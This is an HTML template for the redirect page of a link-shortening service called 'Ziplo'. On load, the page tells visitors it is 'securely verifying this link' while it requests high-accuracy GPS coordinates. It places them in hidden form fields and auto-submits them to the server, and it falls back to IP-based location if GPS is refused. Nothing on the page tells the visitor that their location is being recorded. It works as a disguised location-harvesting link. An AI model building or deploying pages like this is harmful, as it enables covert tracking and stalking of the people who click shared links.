<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting... | Ziplo</title>
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #1e293b;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            max-width: 400px;
            width: 100%;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #3b82f6;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { margin: 0 0 10px; font-weight: 600; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #334155;
            background-color: #0f172a;
            color: white;
            margin-bottom: 15px;
            box-sizing: border-box;
        }
        button {
            background-color: #3b82f6;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }
        button:hover { background-color: #2563eb; }
        .error { color: #ef4444; font-size: 14px; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <h2>Redirecting to your link</h2>
        <p id="status-text">We are securely verifying this link...</p>
        
        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}

        <form id="redirect-form" method="POST" action="/{{ short_code }}" {% if not password_required %}style="display: none;"{% endif %}>
            {% if password_required %}
                <p style="color: #cbd5e1;">This link is password protected.</p>
                <input type="password" name="password" placeholder="Enter password" required />
            {% endif %}
            <input type="hidden" name="lat" id="lat" />
            <input type="hidden" name="lng" id="lng" />
            <button type="submit" id="submit-btn">Continue to Link</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('redirect-form');
        const latInput = document.getElementById('lat');
        const lngInput = document.getElementById('lng');
        const statusText = document.getElementById('status-text');
        const passwordRequired = {{ 'true' if password_required else 'false' }};

        function sendDataAndRedirect(lat = null, lng = null) {
            latInput.value = lat;
            lngInput.value = lng;
            
            if (!passwordRequired) {
                // Auto submit if no password is required
                form.submit();
            } else {
                statusText.innerText = "Please enter the password to continue.";
                document.getElementById('spinner').style.display = 'none';
            }
        }

        function requestLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        statusText.innerText = "GPS locked! Redirecting...";
                        sendDataAndRedirect(position.coords.latitude, position.coords.longitude);
                    },
                    (error) => {
                        console.warn("Location error:", error.message);
                        statusText.style.color = "#ef4444";
                        statusText.innerText = "GPS Failed: " + error.message + ". Falling back to IP...";
                        // Wait 2 seconds so the user can read the error before redirecting
                        setTimeout(() => sendDataAndRedirect(null, null), 2000);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                sendDataAndRedirect(null, null);
            }
        }

        // Auto-request on load
        window.onload = requestLocation;
    </script>
</body>
</html>
